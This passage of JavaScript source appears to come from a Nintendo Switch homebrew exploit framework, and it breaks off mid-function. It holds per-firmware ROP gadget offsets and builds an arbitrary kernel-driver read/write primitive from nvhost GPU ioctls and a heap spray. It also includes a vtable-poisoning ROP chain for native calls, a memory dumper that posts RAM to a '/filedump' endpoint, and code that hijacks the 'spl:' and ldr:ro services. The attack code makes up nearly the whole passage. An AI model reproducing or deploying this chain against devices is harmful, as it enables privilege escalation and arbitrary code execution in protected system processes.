			'write4' : 0x27600,
			'write4_adj' : 0x4,
			'read2' : 0x27580,
			'read2_adj' : 0x24,
			'write2' : 0x275E8,
			'write2_adj' : 0x1A,
			'read1' : 0x275C4,
			'read1_adj' : 0x3,
			'write1' : 0x277A4,
			'write1_adj' : 0x0,
			'malloc' : 0x4B2CC, 
			'free' : 0x4B2DC,
			'malloc_heap' : 0x64c070,
			'svc_dic' : {
				0x2 : 0x12384,
				0x3 : 0x1238C,
				0x4 : 0x12394,
				0x5 : 0x1239C,
				0x6 : 0x123A4,
				0x7 : 0x123BC,
				0x8 : 0x123C4,
				0x9 : 0x123DC,
				0xA : 0x123E4,
				0xB : 0x123EC,
				0xC : 0x123F4,
				0xD : 0x1240C,
				0x11: 0x1241C,
				0x12 : 0x12424,
				0x13 : 0x1242C,
				0x14 : 0x12434,
				0x16 : 0x1243C,
				0x17 : 0x12444,
				0x18 : 0x1244C,
				0x19 : 0x12464,
				0x1A : 0x1246C,
				0x1C : 0x1247C,
				0x1F : 0x1248C,
				0x21 : 0x124A4,
				0x22 : 0x124AC,
				0x25 : 0x124B4,
				0x26 : 0x124CC,
				0x27 : 0x124D4,
				0x28 : 0x124DC,
				0x29 : 0x124E4,
				0x4E : 0x124FC,
				0x40 : 0x12514,
				0x41 : 0x12534,
				0x43 : 0x1254C,
				0x44 : 0x12564,
				0x45 : 0x1257C,
				0x51 : 0xCE010,
				0x52 : 0xCE018,
				0x53 : 0xCE020,
				0x55 : 0xCE038,
				0x56 : 0xCE050,
				0x57 : 0xCE068,
				0x58 : 0xCE070,
				0x59 : 0xCE078,
				0x5C : 0xCE080
			},
		},
		'2.0.0-disabled' : {
			'channel_to_base' : 0x61d910,
			'store_return_branch_a8' : 0x2234,
			'br_38' : 0x7F174,
			'add_x8_br_x2' : 0xBFFF0,
			'add_x8_adj' : 0x608,
			'ldr_blr_x9' : 0x7B20C,
			'partial_load' : 0xB4DAC,
			'shuffle_x0_x8' : 0x7CCB8,
            'shuffle_x0_x8_ofs' : 0x28,
			'store_branch_60' : 0x2E6CC,
			'ldr_br_x1' : 0x2244,
			'save' : 0xB2328,
			'ldr_x0_ret' : 0xC180C,
			'load' : 0xB4D74,
			'br_x16' : 0x334,
			'ldr_x19_ret': 0x7635C,
			'str_x20' : 0x8890,
			'str_x8_x19' : 0x40224,
			'str_x0_x19' : 0x47154,
			'str_x2_x19' : 0x4468C,
			'ldr_x8_str_0_x19' : 0xBDFB8,
			'blr_x8_ret' : 0xF07C,
			'ldr_x2_str_x1_x2' : 0x11B18,
			'ldr_x8_ldr_X1_br_x1' : 0x7CDB0,
			'refresh_x19_x20' : 0x7D0,
			'magic_copy_fuckery' : 0xE548,
			'return_address' : 0x46B0, //0x2D34,
			'nvdrv_heap' : 0x5CD0D0,
			'memcpy' : 0xBB1F4,
			'read4' : 0x8B90,
			'read4_adj' : 0x14,
			'write4' : 0x23D64,
			'write4_adj' : 0x4,
			'read2' : 0x23CE4,
			'read2_adj' : 0x24,
			'write2' : 0x23D4C,
			'write2_adj' : 0x1A,
			'read1' : 0x23D28,
			'read1_adj' : 0x3,
			'write1' : 0x23D08,
			'write1_adj' : 0x0,
			'malloc': 0x4730C,
			'free': 0x4731C,
			'malloc_heap': 0x63B070,
			'svc_dic' : {
				0x2: 0x119C8, // svcSetMemoryPermission
				0x3: 0x119D0, // svcSetMemoryAttribute
				0x4: 0x119D8, // svcMapMemory
				0x5: 0x119E0, // svcUnmapMemory
				0x6: 0x119E8, // svcQueryMemory
				0x7: 0x11A00, // svcExitProcess
				0x8: 0x11A08, // svcCreateThread
				0x9: 0x11A20, // svcStartThread
				0xB: 0x11A30, // svcSleepThread
				0xC: 0x11A38, // svcGetThreadPriority
				0xD: 0x11A50, // svcSetThreadPriority
				0x11: 0x11A60, // svcSignalEvent
				0x12: 0x11A68, // svcClearEvent
				0x13: 0x11A70, // svcMapSharedMemory
				0x14: 0x11A78, // svcUnmapSharedMemory
				0x16: 0x11A80, // svcCloseHandle
				0x17: 0x11A88, // svcResetSignal
				0x18: 0x11A90, // svcWaitSynchronization
				0x19: 0x11AA8, // svcCancelSynchronization
				0x1A: 0x11AB0, // svcArbitrateLock
				0x1C: 0x11AC0, // svcWaitProcessWideKeyAtomic
				0x1F: 0x11AD0, // svcConnectToNamedPort
				0x21: 0x11AE8, // svcSendSyncRequest
				0x22: 0x11AF0, // svcSendSyncRequestWithUserBuffer
				0x26: 0x11AF8, // svcBreak
				0x27: 0x11B00, // svcOutputDebugString
				0x28: 0x11B08, // svcReturnFromException
				0x29: 0x11B10, // svcGetInfo
				0x4E: 0x11B28, // svcReadWriteRegister
				0x40: 0x11B40, // svcCreateSession
				0x41: 0x11B60, // svcAcceptSession
				0x43: 0x11B78, // svcReplyAndReceive
				0x44: 0x11B90, // svcReplyAndReceiveWithUserBuffer
				0x45: 0x11BA8, // svcCreateEvent
				0x51: 0xC4D34, // svcMapTransferMemory
				0x52: 0xC4D3C, // svcUnmapTransferMemory
				0x53: 0xC4D44, // svcCreateInterruptEvent
				0x55: 0xC4D5C, // svcQueryIoMapping
				0x56: 0xC4D74, // svcCreateDeviceAddressSpace
				0x57: 0xC4D8C, // svcAttachDeviceAddressSpace
				0x58: 0xC4D94, // svcDetachDeviceAddressSpace
				0x59: 0xC4D9C, // svcMapDeviceAddressSpaceByForce
				0x5C: 0xC4DA4, // svcUnmapDeviceAddressSpace
			},
		},
	};
	if (this.vers in offset_dic) {
		return offset_dic[this.vers];
	}
	return null;
};

nvcore.prototype.memdump = function(start, totalSize, name) {
	var end = utils.add2(start, totalSize);
	if (arguments.length == 2) {
		name = 'memdumps_nv/nv - '+utils.paddr(start) + ' - ' + utils.paddr(end) + '.bin';
	}

	var buf = new Uint32Array(8 * 1024 * 1024 / 4);
	var addr = sc.read8(sc.getAddr(buf), 4);

	utils.log('Dumping memory to '+name+'!');
	for(var idx = 0; idx < totalSize; idx += 0x700000) {
		size = totalSize - idx;
		size = size > 0x700000 ? 0x700000 : size;
		this.sc.gc();
		var obj = new nvown(buf);
		var base = this.leakPrev(8);
		var nvbuf = utils.add2(base, 0x100000);

		this.slowCall(this.offsets['memcpy'], [nvbuf, start, size]);
		obj.svc.leak();

		this.sc.memview(utils.add2(addr, 0x100000), size, function(ab) {
			var view = new Uint8Array(ab);
			var xhr = new XMLHttpRequest();
			xhr.open('POST', '/filedump', false);
			xhr.setRequestHeader('Content-Type', 'application/octet-stream');
			xhr.setRequestHeader('Content-Disposition', name);
			xhr.send(view);
		});
	}
	this.sc.gc();
	utils.log('Dumped memory succesfully!');
};

nvcore.prototype.slowCall = function(funcptr, args, fargs, dump_regs) {
	if(typeof(funcptr) == 'number') {
		funcptr = utils.add2(this.nv_base, funcptr);
	}
	switch(arguments.length) {
	case 1:
		args = [];
	case 2:
		fargs = [];
	case 3:
		dump_regs = false;
	}

	var saddrs = {};
	var baseScratchOff = this.scratchOff;

	for (var i = 0; i < args.length; i++) {
		if (typeof(args[i]) == 'number') {
			args[i] = [args[i], 0];
		} else if (ArrayBuffer.isView(args[i]) || args[i] instanceof ArrayBuffer) {
			var size = args[i].byteLength;
			var saddr = utils.add2(this.scratch, this.scratchOff);
			this.memcpyFromBrowser(saddr, sc.getArrayBufferAddr(args[i]), size);
			saddrs[i] = saddr;
			this.scratchOff += size;
			if(this.scratchOff & 0x7)
				this.scratchOff = (this.scratchOff & 0xFFFFFFF8) + 8;
		}
	}

	var vtable_save = utils.add2(this.ropBuf, 0x8000);
	var load_buf = utils.add2(this.ropBuf, 0x9000);
	var sp = utils.add2(this.ropBuf, 0x20000);
	var save_buf = utils.add2(this.ropBuf, 0x6000);


	var save = utils.add2(this.nv_base, this.offsets['save']);
	var ldr_x0_ret = utils.add2(this.nv_base, this.offsets['ldr_x0_ret']);
	var load = utils.add2(this.nv_base, this.offsets['load']);
	var br_x16 = utils.add2(this.nv_base, this.offsets['br_x16']);
	var ldr_x19_ret = utils.add2(this.nv_base, this.offsets['ldr_x19_ret']);
	var store_branch_60 = utils.add2(this.nv_base, this.offsets['store_branch_60']);

	// Write registers for native code.
	if(args.length > 0) {
		for(var i = 0; i < 30 && i < args.length; i++) {
			if(ArrayBuffer.isView(args[i]) || args[i] instanceof ArrayBuffer) {
				this.rw.write(saddrs[i], utils.add2(load_buf, 8*i));
			} else {
				this.rw.write(args[i], utils.add2(load_buf, 8*i));
			}
		}
	}

	if(fargs.length > 0) {
		for(var i = 0; i < fargs.length && i < 32; i++) {
			this.rw.write(fargs[i], utils.add2(load_buf, 0x110 + 8*i));
		}
	}

	this.rw.write(store_branch_60, utils.add2(save_buf, this.offsets['shuffle_x0_x8_ofs']));

	this.rw.write(vtable_save, save_buf);
	this.rw.write(save, vtable_save);
	this.rw.write(ldr_x0_ret, utils.add2(sp, 0x8));
	sp = utils.add2(sp, 0x10);

	// SAVE happens here.
	this.rw.write(load_buf, utils.add2(sp, 0x08));
	this.rw.write(load, utils.add2(sp, 0x18));
	sp = utils.add2(sp, 0x20);

	this.rw.write(ldr_x19_ret, utils.add2(sp, 0x08));
	this.rw.write(funcptr, utils.add2(load_buf, 0x80));
	this.rw.write(sp, utils.add2(load_buf, 0xF8));
	this.rw.write(br_x16, utils.add2(load_buf, 0x100));

	sp = utils.add2(sp, 0x10);
	// Call will happen here
	// Cleanup already taken care of by fill_out_rop_buffer!

	this.callObj.svc.open('/dev/memes'); // This actually triggers the call. I'm a bad person.

	var hax_buf = utils.add2(this.ropBuf, 0x10000);

	var ret = this.rw.read(utils.add2(hax_buf, 0x10));

	if(args.length > 0) {
		for(var i = 0; i < 30 && i < args.length; i++) {
			if(ArrayBuffer.isView(args[i]) || args[i] instanceof ArrayBuffer) {
				var size = args[i].byteLength;
				this.memcpyToBrowser(sc.getArrayBufferAddr(args[i]), saddrs[i], size);
			}
		}
	}
	this.scratchOff = baseScratchOff;
	return ret;
};

nvcore.prototype.make_caller_obj = function() {
	var heap_ptr = this.rw.read(utils.add2(this.nv_base, this.offsets['nvdrv_heap']));
	if (this.rw.read(heap_ptr)[0] != 0x45585048) {
		utils.log('WARNING: HEAP PTR OFFSET IS PROBABLY INVALID.');
	}
	var cur_recent = this.rw.read(utils.add2(heap_ptr, 0x80));
	this.callObj = new nvown(new Uint32Array(0x100000 / 4));
	var call_recent = this.rw.read(utils.add2(heap_ptr, 0x80));
	if (cur_recent[0] == call_recent[0]) {
		utils.log('WARNING: FAILED TO FIND NEW OBJECT...');;
	}
	var ud = this.rw.read(call_recent);
	if (ud[0] != 0x5544) {
		utils.log('WARNING: CALLER MEMCHUNK IS FREED?');
	}
	this.callVtableAddr = utils.add2(call_recent, 0x20);
	this.oldVtable = this.rw.read(this.callVtableAddr);
	this.callVtableBufAddr = utils.add2(this.ropBase, 0x98000);
	this.rw.write(this.callVtableBufAddr, this.callVtableAddr);
	for (var i = 0; i < 0x200; i += 0x8) {
		this.rw.write(this.rw.read(utils.add2(this.oldVtable, i)), utils.add2(this.callVtableBufAddr, i));
	}

	// Poison vtable.
	var br_38 = utils.add2(this.nv_base, this.offsets['br_38']);
	var shuffle_x0_x8 = utils.add2(this.nv_base, this.offsets['shuffle_x0_x8']);
	var add_x8_br_x2 = utils.add2(this.nv_base, this.offsets['add_x8_br_x2']);
	var add_x8_adj = this.offsets['add_x8_adj'];


	this.rw.write(br_38, utils.add2(this.callVtableBufAddr, 0x20)); // Open
	this.rw.write(add_x8_br_x2, utils.add2(this.callVtableBufAddr, 0x38)); // *something* >.>
	this.rw.write(shuffle_x0_x8, utils.add2(this.callVtableBufAddr, add_x8_adj + 8)); // safe to nuke
	this.rw.write(this.ropBuf, utils.add2(this.callVtableBufAddr, add_x8_adj)); // Poison **obj with rop buffer
};

nvcore.prototype.fill_out_rop_buffer = function(sc) {
	this.ropBuf = utils.add2(this.ropBase, 0x80000);
	utils.log('ropBuf: '+utils.paddr(this.ropBuf));


	// Set up Gadgets.
	var channel_to_base = utils.add2(this.nv_base, this.offsets['channel_to_base']);
	var store_return_branch_a8 = utils.add2(this.nv_base, this.offsets['store_return_branch_a8']);
	var br_38 = utils.add2(this.nv_base, this.offsets['br_38']);
	var add_x8_br_x2 = utils.add2(this.nv_base, this.offsets['add_x8_br_x2']);
	var add_x8_adj = this.offsets['add_x8_adj'];
	var ldr_blr_x9 = utils.add2(this.nv_base, this.offsets['ldr_blr_x9']);
	var partial_load = utils.add2(this.nv_base, this.offsets['partial_load']);
	var shuffle_x0_x8 = utils.add2(this.nv_base, this.offsets['shuffle_x0_x8']);
	var store_branch_60 = utils.add2(this.nv_base, this.offsets['store_branch_60']);
	var ldr_br_x1 = utils.add2(this.nv_base, this.offsets['ldr_br_x1']);
	var save = utils.add2(this.nv_base, this.offsets['save']);
	var ldr_x0_ret = utils.add2(this.nv_base, this.offsets['ldr_x0_ret']);
	var load = utils.add2(this.nv_base, this.offsets['load']);
	var br_x16 = utils.add2(this.nv_base, this.offsets['br_x16']);
	var ldr_x19_ret = utils.add2(this.nv_base, this.offsets['ldr_x19_ret']);
	var str_x20 = utils.add2(this.nv_base, this.offsets['str_x20']);
	var str_x8_x19 = utils.add2(this.nv_base, this.offsets['str_x8_x19']);
	var str_x0_x19 = utils.add2(this.nv_base, this.offsets['str_x0_x19']);
	var str_x2_x19 = utils.add2(this.nv_base, this.offsets['str_x2_x19']);
	var ldr_x8_str_0_x19 = utils.add2(this.nv_base, this.offsets['ldr_x8_str_0_x19']);
	var blr_x8_ret = utils.add2(this.nv_base, this.offsets['blr_x8_ret']);
	var ldr_x2_str_x1_x2 = utils.add2(this.nv_base, this.offsets['ldr_x2_str_x1_x2']);
	var ldr_x8_ldr_X1_br_x1 = utils.add2(this.nv_base, this.offsets['ldr_x8_ldr_X1_br_x1']);
	var refresh_x19_x20 = utils.add2(this.nv_base, this.offsets['refresh_x19_x20']);
	var magic_copy_fuckery = utils.add2(this.nv_base, this.offsets['magic_copy_fuckery']);
	var return_address = utils.add2(this.nv_base, this.offsets['return_address']);



	// For our convenience
	var vtable = utils.add2(this.ropBuf, 0x1000);
	var vtable2 = utils.add2(this.ropBuf, 0x2000);
	var pl_buf1 = utils.add2(this.ropBuf, 0x3000);
	var pl_buf2 = utils.add2(this.ropBuf, 0x4000);
	var save_buf = utils.add2(this.ropBuf, 0x6000);
	var store_sp = utils.add2(this.ropBuf, 0x7000);
	var vtable_save = utils.add2(this.ropBuf, 0x8000);
	var load_buf = utils.add2(this.ropBuf, 0x9000);
	var sp = utils.add2(this.ropBuf, 0x20000);

	this.rw.write(vtable, this.ropBuf);
	this.rw.write(store_return_branch_a8, utils.add2(vtable, 0x08));
	this.rw.write(store_return_branch_a8, utils.add2(vtable, this.offsets['shuffle_x0_x8_ofs']));
	this.rw.write(add_x8_br_x2, utils.add2(vtable, 0x38));
	this.rw.write(br_38, utils.add2(vtable, 0xA8));
	this.rw.write(pl_buf1, utils.add2(vtable, add_x8_adj));
	this.rw.write(ldr_blr_x9, utils.add2(vtable, add_x8_adj + 8));
	this.rw.write(utils.add2(store_sp, 0x10), utils.add2(vtable, add_x8_adj + 0xF8));
	this.rw.write(br_38, utils.add2(vtable, add_x8_adj + 0x100));

	this.rw.write(vtable2, pl_buf1);
	this.rw.write(partial_load, utils.add2(pl_buf1, 8));

	this.rw.write(pl_buf2, vtable2);
	this.rw.write(shuffle_x0_x8, utils.add2(vtable2, 0x38));


	this.rw.write(save_buf, pl_buf2);
	this.rw.write(store_branch_60, utils.add2(save_buf, this.offsets['shuffle_x0_x8_ofs']));
	this.rw.write(partial_load, utils.add2(pl_buf2, 0x60));
	this.rw.write(sp, utils.add2(pl_buf2, 0xF8));
	this.rw.write(ldr_br_x1, utils.add2(pl_buf2, 0x100));


	this.rw.write(vtable_save, save_buf);
	this.rw.write(save, vtable_save);
	this.rw.write(ldr_x0_ret, utils.add2(sp, 0x8));
	sp = utils.add2(sp, 0x10);


	// SAVE happens here.
	this.rw.write(load_buf, utils.add2(sp, 0x08));
	this.rw.write(load, utils.add2(sp, 0x18));
	sp = utils.add2(sp, 0x20);



	this.rw.write(ldr_x19_ret, utils.add2(sp, 0x08));
	sp = utils.add2(sp, 0x10);
	// Call will happen here

	// Cleanup!
	var hax_buf = utils.add2(this.ropBuf, 0x10000);
	var dump_buf = utils.add2(this.ropBuf, 0x11000);
	this.rw.write(utils.sub2(hax_buf, 0x1A8), utils.add2(sp, 0x00));
	this.rw.write(str_x20, utils.add2(sp, 0x18));
	sp = utils.add2(sp, 0x20);


	this.rw.write(utils.sub2(hax_buf, 0x8), utils.add2(sp, 0x08));
	this.rw.write(str_x8_x19, utils.add2(sp, 0x18));
	sp = utils.add2(sp, 0x20);

	this.rw.write(utils.add2(hax_buf, 0x10), utils.add2(sp, 0x00));
	this.rw.write(str_x0_x19, utils.add2(sp, 0x18));
	sp = utils.add2(sp, 0x20);

	this.rw.write(utils.sub2(hax_buf, 0x90), utils.add2(sp, 0x00));
	this.rw.write(str_x2_x19, utils.add2(sp, 0x18));
	sp = utils.add2(sp, 0x20);

	this.rw.write(utils.add2(hax_buf, 0x100), utils.add2(sp, 0x08));
	this.rw.write(ldr_x8_str_0_x19, utils.add2(sp, 0x18));
	sp = utils.add2(sp, 0x20);

	this.rw.write(ldr_x2_str_x1_x2, utils.add2(sp, 0x08));
	this.rw.write(blr_x8_ret, utils.add2(sp, 0x28));
	sp = utils.add2(sp, 0x30);

	this.rw.write(utils.add2(hax_buf, 0x20), utils.add2(sp, 0x00));
	sp = utils.add2(sp, 0x10);

	this.rw.write(ldr_x0_ret, utils.add2(sp, 0x8));
	sp = utils.add2(sp, 0x10);

	this.rw.write(dump_buf, utils.add2(sp, 0x08));
	this.rw.write(ldr_x8_ldr_X1_br_x1, utils.add2(sp, 0x18));
	sp = utils.add2(sp, 0x20);

	this.rw.write(dump_buf, dump_buf);
	this.rw.write(save, utils.add2(dump_buf, 0x8));
	this.rw.write(ldr_x0_ret, utils.add2(sp, 0x18));
	sp = utils.add2(sp, 0x20);

	this.rw.write(save_buf, utils.add2(sp, 0x08));
	this.rw.write(refresh_x19_x20, utils.add2(sp, 0x18));
	sp = utils.add2(sp, 0x20);

	this.rw.write(utils.sub2(utils.add2(store_sp, 0x00), 0x70), utils.add2(sp, 0x0));
	this.rw.write(utils.sub2(utils.add2(save_buf, 0xF8), 0x08), utils.add2(sp, 0x8));
	this.rw.write(magic_copy_fuckery, utils.add2(sp, 0x18));
	sp = utils.add2(sp, 0x20);


	// Fix SP
	this.rw.write(utils.sub2(utils.add2(hax_buf, 0x180), 0x70), utils.add2(sp, 0x70));
	this.rw.write(utils.sub2(utils.add2(save_buf, 0x100), 0x08), utils.add2(sp, 0x78));
	this.rw.write(magic_copy_fuckery, utils.add2(sp, 0x88));
	sp = utils.add2(sp, 0x90);


	// Fix LR
	this.rw.write(return_address, utils.add2(hax_buf, 0x180));

	this.rw.write(utils.sub2(utils.add2(hax_buf, 0x190), 0x70), utils.add2(sp, 0x70));
	this.rw.write(utils.sub2(utils.add2(save_buf, 0x0), 0x08), utils.add2(sp, 0x78));
	this.rw.write(magic_copy_fuckery, utils.add2(sp, 0x88));
	sp = utils.add2(sp, 0x90);


	// Fix X0
	this.rw.write([0xCAFE, 0x0], utils.add2(hax_buf, 0x188));

	this.rw.write(load, utils.add2(sp, 0x88)); // pls
	sp = utils.add2(sp, 0x90);
};

nvcore.prototype.leakPrev = function(size) {
	var leaker = new nvown(new Uint32Array(1 * 1024 * 1024 / 4));
	var addr = leaker.svc.leak();
	var base = sc.read8(addr, 0x8008 >> 2);
	leaker.svc.tback = null;
	switch(size) {
	case 1:
		return utils.sub2(base, 0x8000);
	case 8:
		return utils.sub2(base, 0xc000);
	case 64:
		return utils.sub2(base, 0x2b000);
	}
	return base;
};

nvcore.prototype.get_rw_primitive = function(sc) {

	var GET_USER_ADDRESS = 0x80084715;
    var SET_USER_ADDRESS = 0x40084714;
	// Leak channel address!
	var tback = new Uint32Array(1 * 1024 * 1024 / 4);
	var obj1 = new nvown(tback);
	obj1.svc.open('/dev/nvhost-gpu');
	var buf = obj1.svc.leak();
	var nvhost_channel = sc.read8(buf, 0xC000 >> 2);
	utils.log('nvhost_channel at ' + utils.paddr(nvhost_channel));

	this.channel_addr = nvhost_channel;
	tback = obj1.svc.tback = null;

	var protectedObj = new nvown(new Uint32Array(1 * 1024 * 1024 / 4));
	var protectedBase = this.leakPrev(1);
	utils.log(utils.paddr(protectedBase));
    this.protectedBase = protectedBase;
    

	var buf = new Uint32Array(2);
	buf[0] = 0x12345678;
	buf[1] = 0x87654321;
	utils.log(protectedObj.gpu.ioctl(SET_USER_ADDRESS, buf).toString(16));

	sc.enableTurbo(); // 15 times faster

	var vicBuf = new Uint32Array(8 * 1024 * 1024 / 4);
	var rwaddr = utils.add2(protectedBase, 0xc008 - 0x78);

    vicBuf[0x700000 >> 2] = nvhost_channel[0];
    vicBuf[0x700004 >> 2] = nvhost_channel[1];
    vicBuf[0x700008 >> 2] = rwaddr[0];
    vicBuf[0x70000C >> 2] = rwaddr[1];

	var vicObj = new nvown(vicBuf);
    var vicBase = this.leakPrev(8);
    this.vicBase = vicBase;

	this.ropBase = utils.add2(vicBase, 0x400000);
	this.ropBuf = utils.add2(this.ropBase, 0x80000);

    
    this.pauseWrite(utils.add2(vicBase, 0x700000), utils.add2(vicBase, 0xf000));
    var buf = new Uint32Array(2);
    vicObj.gpu.ioctl(GET_USER_ADDRESS, buf);
	this.protUserAddr = [buf[0], buf[1]];

	this.rw = new nvrw(vicObj, protectedObj);

    // Clean up Vic Obj
    this.write8(utils.add2(this.vicBase, 0x9000), utils.add2(this.vicBase, 0xF008));

    utils.log('Got RW primitive!');

};

nvcore.prototype.pauseWrite = function(val, addr) {
    if (typeof(val) === 'number') {
        val = [val, 0];
    }
    var sprayBuf = new Uint32Array([0x03020100, 0x07060504, 0x0B0A0908, 0x0F0E0D0C, 0x13121110, 0x17615114, 0x1B1A1918, 0x1F1E1D1C, 0x23222120, val[1], val[0], 0x2F2E2D2C]);
    this.spray(sprayBuf, utils.sub2(addr, 0x24));
    this.spray(sprayBuf, utils.sub2(addr, 0x24));
}

nvcore.prototype.spray = function(sprayBuf, addr) {
    var buf = new Uint32Array(1 * 1024 * 1024 / 4);
    var atk = new nvown(buf);
	var atkBase = this.leakPrev(1);
    var ctrl = atk.svc.open('/dev/nvhost-ctrl-gpu');
    var NVGPU_GPU_IOCTL_ZBC_SET_TABLE = 0x402C4703;
    var NVGPU_GPU_IOCTL_WAIT_FOR_PAUSE = 0xC0084710;
    ctrl.ioctl(NVGPU_GPU_IOCTL_ZBC_SET_TABLE, sprayBuf);
    ctrl.ioctl(NVGPU_GPU_IOCTL_WAIT_FOR_PAUSE, new Uint32Array(addr));
    atk.svc.leak();
    atk.svc.tback = null;
    //utils.log('Sprayed!');
}

nvcore.prototype.read8 = function(addr) {
	return this.rw.read(addr);
};

nvcore.prototype.read4 = function(addr) {
	return this.slowCall(this.offsets['read4'], [utils.sub2(addr, this.offsets['read4_adj'])]);
};

nvcore.prototype.read2 = function(addr) {
	return this.slowCall(this.offsets['read2'], [utils.sub2(addr, this.offsets['read2_adj'])]);
};

nvcore.prototype.read1 = function(addr) {
	return this.slowCall(this.offsets['read1'], [utils.sub2(addr, this.offsets['read1_adj'])]);
};

nvcore.prototype.write8 = function(val, addr) {
	this.rw.write(val, addr);
};

nvcore.prototype.write4 = function(val, addr) {
	this.slowCall(this.offsets['write4'], [utils.sub2(addr, this.offsets['write4_adj']), val]);
};

nvcore.prototype.write2 = function(val, addr) {
	this.slowCall(this.offsets['write2'], [utils.sub2(addr, this.offsets['write2_adj']), val]);
};

nvcore.prototype.write1 = function(val, addr) {
	this.slowCall(this.offsets['write1'], [utils.sub2(addr, this.offsets['write1_adj']), val]);
};

nvcore.prototype.memcpyFromBrowser = function(dst, src, size) {
	this.sc.memcpy(this.tempBufAddr, src, size);
	var obj = new nvown(this.tempBuf);
	var base = this.leakPrev(8);
	var nvbuf = utils.add2(base, 0x100000);

	this.slowCall(this.offsets['memcpy'], [dst, nvbuf, size]);
	obj.svc.leak();
};

nvcore.prototype.memcpyToBrowser = function(dst, src, size) {
	var obj = new nvown(this.tempBuf);
	var base = this.leakPrev(8);
	var nvbuf = utils.add2(base, 0x100000);

	this.slowCall(this.offsets['memcpy'], [nvbuf, src, size]);
	obj.svc.leak();
	this.sc.memcpy(dst, this.tempBufAddr, size);
};

nvcore.prototype.malloc = function(size) {
	return this.slowCall(this.offsets['malloc'], [utils.add2(this.nv_base, this.offsets['malloc_heap']), size]);
};

nvcore.prototype.free = function(addr) {
	this.slowCall(this.offsets['free'], [utils.add2(this.nv_base, this.offsets['malloc_heap']), addr]);
};

nvcore.prototype.setup_ro_hax = function() {
	var nvIpcBuf = utils.add2(this.nv_base, 0x550000);
	var nvTempBuf = new Uint32Array(8 * 1024 * 1024 / 4);

	var nv = this;
	var sc = this.sc;

	function waitHandles(handles) {
		for(var i = 0; i < handles.length; ++i)
			nv.write4(handles[i], utils.add2(nvIpcBuf, 4 + i * 4));
		var ret = nv.svc(0x18, [nvIpcBuf, utils.add2(nvIpcBuf, 4), handles.length, 0])[0];
		var hndI = nv.read4(nvIpcBuf)[0];
		return [ret, hndI];
	}

	function acceptSession(handle) {
		nv.svc(0x41, [nvIpcBuf, handle]);
		return nv.read4(nvIpcBuf)[0];
	}

	function readIncoming(handle) {
		utils.log('Writing handle');
		nv.write8([handle, 0], nv.scratch);
		utils.log('foo');
		var data = new Uint32Array(0x100);
		nv.memcpyFromBrowser(nvIpcBuf, sc.read8(sc.getAddr(data), 4), 0x100 << 2);
		utils.log('replyandreceive');
		var ret = nv.svc(0x44, [nv.scratch, nvIpcBuf, 0x1000, nv.scratch, 1, [0, 0], [0xffffffff, 0xffffffff]])[0];
		utils.log('Copying data');
		if(ret == 0xf601)
			return null;
		var data = new Uint32Array(0x100);
		nv.memcpyToBrowser(sc.read8(sc.getAddr(data), 4), nvIpcBuf, 0x100 << 2);
		utils.log('Done?');
		return data;
	}

	function respond(handle, data) {
		utils.log('Attempting to respond');
		nv.memcpyFromBrowser(nvIpcBuf, sc.read8(sc.getAddr(data), 4), data.length << 2);
		utils.log('replyandreceive');
		utils.log(utils.paddr(nv.svc(0x44, [nv.scratch, nvIpcBuf, 0x1000, nv.scratch, 0, handle, [0, 0]])));
		utils.log('Done?');
	}

	this.sc.unregisterService('spl:');

	nv.svc(0x1F, [nvIpcBuf, utils.add2(nv.nv_base, 0xE6CDD)]);
	var nvSmHandle = nv.read8(nvIpcBuf)[0];
	utils.log('SM handle: ' + nvSmHandle.toString(16));

	var data = new Uint32Array([0x4, 0xc, 0, 0, 0x49434653, 0, 2, 0, 0x3a6c7073, 0, 200, 0x20]);
	nv.memcpyFromBrowser(nvIpcBuf, sc.read8(sc.getAddr(data), 4), data.length << 2);
	utils.paddr(nv.svc(0x22, [nvIpcBuf, 0x1000, nvSmHandle]));
	var output = new Uint32Array(0x100);
	nv.memcpyToBrowser(sc.read8(sc.getAddr(output), 4), nvIpcBuf, 0x100 << 2);

	var portHandle = output[3];
	utils.log('Port handle: ' + portHandle.toString(16));
	var handles = [portHandle];

	waitHandles(handles);

	getServicePid = function(service) {
		this.sc.killAutoHandle();
		var res = this.sc.ipcMsg(2).setType(3).datau64(0).sendTo(service).show();
		this.sc.svcCloseHandle(res.movedHandles[0]);
		return res.pid[0];
	};

	var service = 'ldr:ro';
	var pid = getServicePid(service);
	utils.log(service + ' is PID 0x'+pid.toString(16));

	this.sc.ipcMsg(1).data(pid).sendTo('pm:shell').assertOk();

	var tid = utils.parseAddr('0100000000000037');

	var newPid = this.sc.ipcMsg(0).datau64(0, tid, 3).sendTo('pm:shell').show().data[0];
	utils.log("new pid: 0x" + newPid.toString(16));
	
	var interval = setInterval(function() {
		var temp = waitHandles(handles);
		switch(temp[0]) {
		case 0:
			utils.log('Handle ' + temp[1] + ' ready');
			var handle = handles[temp[1]];
			if(handle == portHandle) {
				var pipe = acceptSession(portHandle);
				utils.log('Accepted new pipe ' + pipe.toString(16));
				handles.push(pipe);
			} else {
				utils.log('Got incoming message on ' + handle.toString(16));
				var data = readIncoming(handle);
				if(data == null) {
					utils.log('Pipe closed.  Removing.');
					nv.svc(0x16, [handle]);
					handles.splice(handles.indexOf(handle), 1);
					clearInterval(interval); // We should be done now!
					break;
				}

				if(data[6] == 11) { // GetDevUnitFlag
					respond(handle, new Uint32Array([0, 0xa, 0, 0, 0x4f434653, 0, 0, 0, 0, 0]));
				} else if(data[6] == 0) {
					respond(handle, new Uint32Array([0, 0xa, 0, 0, 0x4f434653, 0, 0, 0, 1, 0]));
				} else {
					clearInterval(interval);
				}
			}
			break;
		case 0xea01:
			break;
		default:
			utils.log('Unknown ret for wait: ' + temp[0].toString(16));
			break;
		}
	}, 100);
};

var nvrw = function(vicObj, protObj) {
	this.vicObj = vicObj;
	this.protObj = protObj;
	this.SET_USER_ADDRESS = 0x40084714;
	this.GET_USER_ADDRESS = 0x80084715;

	this.buf = new Uint32Array(2);
};

nvrw.prototype.read = function(addr) {
	var corr = utils.sub2(addr, 0x78);
	this.buf[0] = corr[0]; this.buf[1] = corr[1];
	this.vicObj.gpu.ioctl(this.SET_USER_ADDRESS, this.buf);
	this.buf[0] = this.buf[1] = 0;
	this.protObj.gpu.ioctl(this.GET_USER_ADDRESS, this.buf);
	return [this.buf[0], this.buf[1]];
};

nvrw.prototype.write = function(val, addr) {
	val = utils.pad64(val);
	var corr = utils.sub2(addr, 0x78);
	this.buf[0] = corr[0]; this.buf[1] = corr[1];
	this.vicObj.gpu.ioctl(this.SET_USER_ADDRESS, this.buf);
	var cval = utils.add2(val, 0);
